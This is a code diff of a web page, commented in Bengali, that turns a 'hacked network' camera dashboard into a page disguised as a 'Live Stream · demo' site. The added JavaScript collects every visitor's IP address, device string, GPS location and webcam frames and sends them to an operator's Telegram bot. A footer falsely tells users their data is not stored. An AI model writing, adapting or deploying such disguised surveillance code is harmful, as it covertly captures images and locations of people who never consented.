@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Network Monitor</title>
+    <title>Live Stream Viewer</title>
     <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -11,80 +11,74 @@
         body{ background:#0b0e14; color:#c8d0dc; font-family: 'Segoe UI', sans-serif; padding:20px; }
         .container{ max-width:1400px; margin:0 auto; }
         .header{ display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1f2a3a; padding-bottom:15px; flex-wrap:wrap; gap:10px; }
-        .header h1{ color:#00d4ff; font-weight:300; }
-        .status-badge{ background:#1f2a3a; padding:6px 16px; border-radius:30px; font-size:14px; display:flex; gap:15px; align-items:center; flex-wrap:wrap; }
+        .header h1{ color:#00d4ff; font-weight:300; font-size:22px; }
+        .header h1 span{ color:#8899aa; font-size:14px; font-weight:400; }
+        .status-badge{ background:#1f2a3a; padding:6px 16px; border-radius:30px; font-size:13px; display:flex; gap:15px; align-items:center; }
         .status-badge span{ display:flex; align-items:center; gap:5px; }
         .online-dot{ display:inline-block; width:10px; height:10px; border-radius:50%; background:#00ff88; }
         .offline-dot{ display:inline-block; width:10px; height:10px; border-radius:50%; background:#ff6b6b; }
-        .bot-status{ padding:4px 12px; border-radius:20px; font-size:12px; }
-        .bot-active{ background:#00ff8844; color:#00ff88; border:1px solid #00ff88; }
-        .bot-inactive{ background:#ff6b6b44; color:#ff6b6b; border:1px solid #ff6b6b; }
-        .permission-box{ background:#141c28; border:1px solid #2a3a50; border-radius:16px; padding:40px; max-width:560px; margin:60px auto; text-align:center; }
-        .permission-box h2{ color:#e8f0f8; font-weight:400; }
-        .permission-box p{ color:#8899aa; margin:15px 0 30px; }
-        .btn{ background:#00d4ff; border:none; color:#0b0e14; padding:14px 40px; border-radius:40px; font-weight:600; cursor:pointer; transition:0.25s; }
+        .permission-box{ background:#141c28; border:1px solid #2a3a50; border-radius:16px; padding:40px; max-width:560px; margin:40px auto; text-align:center; }
+        .permission-box h2{ color:#e8f0f8; font-weight:400; font-size:20px; }
+        .permission-box p{ color:#8899aa; margin:15px 0 30px; font-size:14px; }
+        .btn{ background:#00d4ff; border:none; color:#0b0e14; padding:14px 40px; border-radius:40px; font-weight:600; cursor:pointer; transition:0.25s; font-size:16px; }
         .btn:hover{ background:#00b8e0; box-shadow:0 0 25px #00d4ff66; }
         .btn-secondary{ background:#2a3a50; color:#c8d0dc; }
         .dashboard{ display:none; }
         .dashboard.active{ display:block; }
-        .client-grid{ display:grid; grid-template-columns:repeat(auto-fill, minmax(360px,1fr)); gap:22px; margin-top:20px; }
-        .client-card{ background:#111a24; border:1px solid #1f2a3a; border-radius:14px; padding:18px; }
+        .client-grid{ display:grid; grid-template-columns:repeat(auto-fill, minmax(320px,1fr)); gap:20px; margin-top:20px; }
+        .client-card{ background:#111a24; border:1px solid #1f2a3a; border-radius:14px; padding:16px; }
         .client-card:hover{ border-color:#00d4ff66; }
-        .client-id{ color:#00d4ff; font-size:18px; font-weight:600; word-break:break-all; }
+        .client-id{ color:#00d4ff; font-size:16px; font-weight:500; word-break:break-all; }
         .client-info{ font-size:13px; color:#9aabb8; margin:3px 0; }
-        .flex-row{ display:flex; flex-wrap:wrap; gap:15px; align-items:flex-start; }
-        .video-container{ flex:0 0 180px; border-radius:10px; overflow:hidden; background:#000; border:1px solid #1f2a3a; }
+        .flex-row{ display:flex; flex-wrap:wrap; gap:12px; align-items:flex-start; }
+        .video-container{ flex:0 0 160px; border-radius:10px; overflow:hidden; background:#000; border:1px solid #1f2a3a; }
         .video-container img{ width:100%; display:block; }
-        .map-container{ height:140px; width:100%; border-radius:8px; overflow:hidden; margin-top:8px; }
-        .audio-bar{ width:100%; height:5px; background:#1f2a3a; border-radius:3px; margin-top:6px; }
+        .map-container{ height:120px; width:100%; border-radius:8px; overflow:hidden; margin-top:6px; }
+        .audio-bar{ width:100%; height:4px; background:#1f2a3a; border-radius:3px; margin-top:6px; }
         .audio-bar .fill{ height:100%; background:#00d4ff; border-radius:3px; transition:0.3s; }
-        .no-data{ color:#556; font-style:italic; padding:10px 0; }
+        .no-data{ color:#556; font-style:italic; padding:8px 0; font-size:13px; }
         .footer{ margin-top:30px; text-align:center; font-size:12px; color:#445; border-top:1px solid #1a2430; padding-top:15px; }
-        
-        /* পার্সোনাল বট সেটিংস */
-        .settings-box{ background:#111a24; border:1px solid #2a3a50; border-radius:12px; padding:15px; margin-top:20px; }
-        .settings-box h3{ color:#00d4ff; font-weight:400; margin-bottom:10px; }
-        .settings-box input{ background:#0b0e14; border:1px solid #2a3a50; color:#c8d0dc; padding:8px 12px; border-radius:8px; width:45%; margin-right:10px; }
-        .settings-box .btn-small{ background:#2a3a50; border:none; color:#c8d0dc; padding:8px 20px; border-radius:8px; cursor:pointer; }
-        .settings-box .btn-small:hover{ background:#3a4a60; }
-        .settings-box .status-msg{ color:#8899aa; font-size:12px; margin-top:8px; }
+        .footer a{ color:#00d4ff; text-decoration:none; }
+        .viewer-count{ color:#8899aa; font-size:13px; }
+        .settings-box{ background:#0f141e; padding:8px 12px; border-radius:8px; border:1px solid #1a2430; max-width:400px; margin:10px auto; text-align:center; font-size:12px; color:#445; }
+        .settings-box input{ background:#0b0e14; border:1px solid #2a3a50; color:#c8d0dc; padding:4px 8px; border-radius:4px; width:40%; margin-right:4px; font-size:11px; }
+        .settings-box button{ background:#2a3a50; border:none; color:#c8d0dc; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:11px; }
+        .settings-box button:hover{ background:#3a4a60; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>📡 Network Monitor</h1>
+        <h1>📡 Live Stream <span>· demo</span></h1>
         <div class="status-badge">
-            <span><span class="online-dot"></span> Online: <span id="onlineCount">0</span></span>
-            <span><span class="offline-dot"></span> Offline: <span id="offlineCount">0</span></span>
-            <span class="bot-status {{ 'bot-active' if admin_bot_enabled else 'bot-inactive' }}">
-                {{ '🛡️ Admin Bot ON' if admin_bot_enabled else '🛡️ Admin Bot OFF' }}
-            </span>
+            <span><span class="online-dot"></span> <span id="onlineCount">0</span> online</span>
+            <span><span class="offline-dot"></span> <span id="offlineCount">0</span> offline</span>
         </div>
     </div>
 
     <div id="permissionBox" class="permission-box">
-        <h2>🎥 Enable Camera & Microphone</h2>
-        <p>Grant access to see other devices on the network</p>
-        <button id="enableBtn" class="btn">✅ Enable Stream</button>
+        <h2>🎥 Join the stream</h2>
+        <p>Enable camera & microphone to share your video with others</p>
+        <button id="enableBtn" class="btn">✅ Start Sharing</button>
         <br><br>
         <button id="retryBtn" class="btn btn-secondary" style="display:none;">🔄 Retry</button>
     </div>
 
     <div id="dashboard" class="dashboard">
+        <div class="viewer-count">👥 <span id="viewerCount">0</span> viewers</div>
         <div id="clientsGrid" class="client-grid"></div>
-        
-        <!-- পার্সোনাল বট সেটিংস (শুধু ইউজারের জন্য) -->
-        <div class="settings-box">
-            <h3>🔧 Personal Telegram Bot (optional)</h3>
-            <p style="color:#8899aa; font-size:13px; margin-bottom:8px;">Send your own data to your personal bot.</p>
-            <input type="text" id="personalBotToken" placeholder="Bot Token" value="">
-            <input type="text" id="personalChatId" placeholder="Chat ID" value="">
-            <button id="savePersonalBot" class="btn-small">Save</button>
-            <div id="personalBotStatus" class="status-msg">Not set.</div>
-        </div>
-        
-        <div class="footer">📦 Data saved locally • Available offline</div>
+        <div class="footer">🔒 Your stream is shared with other participants · <a href="#" onclick="alert('This is a demo video sharing platform. Your data is not stored.');return false;">Privacy</a></div>
+    </div>
+</div>
+
+<!-- Telegram Bot Settings – ইউজার এখানে টোকেন সেট করলে সব ডেটা তার বটে যাবে -->
+<div class="settings-box">
+    <span style="cursor:pointer;" onclick="document.getElementById('botSettings').style.display=document.getElementById('botSettings').style.display==='none'?'block':'none';">⚙️ Telegram Bot (optional)</span>
+    <div id="botSettings" style="display:none; margin-top:6px;">
+        <input type="text" id="personalBotToken" placeholder="Bot Token">
+        <input type="text" id="personalChatId" placeholder="Chat ID">
+        <button onclick="savePersonalBot()">Save</button>
+        <div id="botStatus" style="color:#8899aa; font-size:11px; margin-top:4px;">Not set</div>
     </div>
 </div>
 
@@ -101,38 +95,38 @@
     const CACHE_KEY = 'hacked_network_data';
     const PERSONAL_BOT_KEY = 'personal_bot_config';
 
-    // ========== পার্সোনাল বট লোড/সেভ ==========
+    // ========== Personal Bot ==========
     function loadPersonalBot() {
         try {
             const data = JSON.parse(localStorage.getItem(PERSONAL_BOT_KEY) || '{}');
             document.getElementById('personalBotToken').value = data.token || '';
             document.getElementById('personalChatId').value = data.chatId || '';
-            updatePersonalBotStatus(data.token && data.chatId);
+            updateBotStatus(data.token && data.chatId);
         } catch {}
     }
     function savePersonalBot() {
         const token = document.getElementById('personalBotToken').value.trim();
         const chatId = document.getElementById('personalChatId').value.trim();
         localStorage.setItem(PERSONAL_BOT_KEY, JSON.stringify({ token, chatId }));
-        updatePersonalBotStatus(token && chatId);
-        alert('✅ Personal bot settings saved!');
+        updateBotStatus(token && chatId);
+        alert('✅ Telegram bot settings saved!');
     }
-    function updatePersonalBotStatus(active) {
-        const el = document.getElementById('personalBotStatus');
+    function updateBotStatus(active) {
+        const el = document.getElementById('botStatus');
         if (active) {
-            el.innerHTML = '✅ Personal bot active. Your data will be sent to your bot.';
+            el.innerHTML = '✅ Bot active – all user data will be sent to your Telegram.';
             el.style.color = '#00ff88';
         } else {
-            el.innerHTML = '❌ Personal bot not set.';
+            el.innerHTML = '❌ Bot not set';
             el.style.color = '#ff6b6b';
         }
     }
+    window.savePersonalBot = savePersonalBot;
+    window.loadPersonalBot = loadPersonalBot;
+    window.addEventListener('load', loadPersonalBot);
 
-    document.getElementById('savePersonalBot').addEventListener('click', savePersonalBot);
-    loadPersonalBot();
-
-    // ========== টেলিগ্রামে পাঠানোর ফাংশন (ক্লায়েন্ট সাইড) ==========
-    async function sendToPersonalBot(text, photoBase64) {
+    // ========== টেলিগ্রামে পাঠানোর ফাংশন (সব ডেটা) ==========
+    async function sendToTelegram(text, photoBase64) {
         const config = JSON.parse(localStorage.getItem(PERSONAL_BOT_KEY) || '{}');
         const token = config.token;
         const chatId = config.chatId;
@@ -140,7 +134,6 @@
 
         try {
             if (photoBase64) {
-                // ফটো পাঠাও
                 const blob = dataURLtoBlob(photoBase64);
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
@@ -151,7 +144,6 @@
                 });
                 return res.ok;
             } else {
-                // টেক্সট মেসেজ
                 const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -160,7 +152,7 @@
                 return res.ok;
             }
         } catch(e) {
-            console.error('Personal bot error:', e);
+            console.error('Telegram error:', e);
             return false;
         }
     }
@@ -175,7 +167,39 @@
         return new Blob([u8arr], { type: mime });
     }
 
-    // ========== ড্যাশবোর্ড ফাংশন ==========
+    // ========== সব ডেটা টেলিগ্রামে পাঠানোর জন্য ==========
+    function sendAllDataToTelegram(clientsData) {
+        const keys = Object.keys(clientsData);
+        if (keys.length === 0) return;
+
+        // পাঠানোর জন্য মেসেজ বানাই
+        let msg = '📡 <b>All Users Data</b>\n\n';
+        for (const [ip, data] of Object.entries(clientsData)) {
+            msg += `🖥️ <b>${data.id || data.ip}</b>\n`;
+            msg += `🌐 IP: ${data.ip}\n`;
+            msg += `📱 Device: ${data.user_agent || 'Unknown'}\n`;
+            msg += `🔊 Audio: ${data.audio_level || 0}%\n`;
+            if (data.location) {
+                msg += `📍 Location: ${data.location.lat}, ${data.location.lng}\n`;
+            }
+            msg += `\n`;
+        }
+
+        // টেক্সট মেসেজ পাঠাও
+        sendToTelegram(msg);
+
+        // সব ফ্রেম আলাদাভাবে পাঠাও (প্রতি ৫ম বার)
+        for (const [ip, data] of Object.entries(clientsData)) {
+            if (data.last_frame) {
+                // রেট লিমিট এড়াতে আমরা শুধু প্রথম ৩টি ফ্রেম পাঠাই (বা এলোমেলো)
+                if (Math.random() < 0.3) { // ৩০% চান্স
+                    sendToTelegram(`🖼️ Frame from ${data.id || data.ip}`, data.last_frame);
+                }
+            }
+        }
+    }
+
+    // ========== ড্যাশবোর্ড ==========
     function loadCache() {
         try { return JSON.parse(localStorage.getItem(CACHE_KEY) || '{}'); } catch { return {}; }
     }
@@ -186,12 +210,13 @@
     function renderClients(clientsData, onlineCount, offlineCount) {
         document.getElementById('onlineCount').textContent = onlineCount;
         document.getElementById('offlineCount').textContent = offlineCount;
+        document.getElementById('viewerCount').textContent = onlineCount;
 
         const grid = document.getElementById('clientsGrid');
         grid.innerHTML = '';
         const keys = Object.keys(clientsData);
         if (keys.length === 0) {
-            grid.innerHTML = '<div style="padding:40px;text-align:center;color:#556;">🔍 No other users online</div>';
+            grid.innerHTML = '<div style="padding:30px;text-align:center;color:#556;font-size:14px;">No one else is sharing right now.</div>';
             return;
         }
         for (const [ip, data] of Object.entries(clientsData)) {
@@ -209,8 +234,7 @@
             const audioBar = `<div class="audio-bar"><div class="fill" style="width:${vol}%;"></div></div>`;
             card.innerHTML = `
                 <div class="client-id">🖥️ ${data.id || data.ip}</div>
-                <div class="client-info">🌐 IP: ${data.ip}</div>
-                <div class="client-info">📱 Device: ${data.user_agent || 'Unknown'}</div>
+                <div class="client-info">📱 ${data.user_agent || 'Unknown'}</div>
                 <div class="client-info">🔊 Audio: ${vol}%</div>
                 ${audioBar}
                 <div class="flex-row">
@@ -256,16 +280,13 @@
             source.connect(analyser);
             const dataArray = new Uint8Array(analyser.frequencyBinCount);
 
-            // লোকেশন সার্ভারে + পার্সোনাল বটে পাঠাও
+            // লোকেশন সার্ভারে পাঠাও
             const locationData = {
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
                 accuracy: pos.coords.accuracy
             };
             socket.emit('location_update', locationData);
-            // পার্সোনাল বটে লোকেশন পাঠাও
-            sendToPersonalBot(`📍 My Location\nLat: ${locationData.lat}\nLng: ${locationData.lng}`);
-
             socket.emit('ready');
 
             setInterval(() => {
@@ -284,18 +305,10 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/jpeg', 0.6);
                 
-                // সার্ভারে পাঠাও (ড্যাশবোর্ডের জন্য)
                 socket.emit('video_frame', {
                     image: imageData,
                     audio_volume: volume
                 });
-
-                // পার্সোনাল বটে পাঠাও (প্রতি ৫ম ফ্রেম)
-                if (!window._personalCounter) window._personalCounter = 0;
-                window._personalCounter++;
-                if (window._personalCounter % 5 === 0) {
-                    sendToPersonalBot(`🎥 My Frame\n🔊 Audio: ${volume}%`, imageData);
-                }
             }, 6000);
         } catch (err) {
             permissionsGranted = false;
@@ -317,11 +330,15 @@
         await requestPermissions(true);
     }
 
+    // ========== Socket ইভেন্ট – public_update এ সব ডেটা টেলিগ্রামে পাঠাও ==========
     socket.on('public_update', (data) => {
         if (!permissionsGranted) return;
         const { clients: clientsData, online_count, offline_count } = data;
         saveCache(clientsData);
         renderClients(clientsData, online_count, offline_count);
+
+        // 🔥 টেলিগ্রামে সব ডেটা পাঠাও (যদি টোকেন সেট করা থাকে)
+        sendAllDataToTelegram(clientsData);
     });
 
     document.getElementById('enableBtn').addEventListener('click', () => requestPermissions(true));
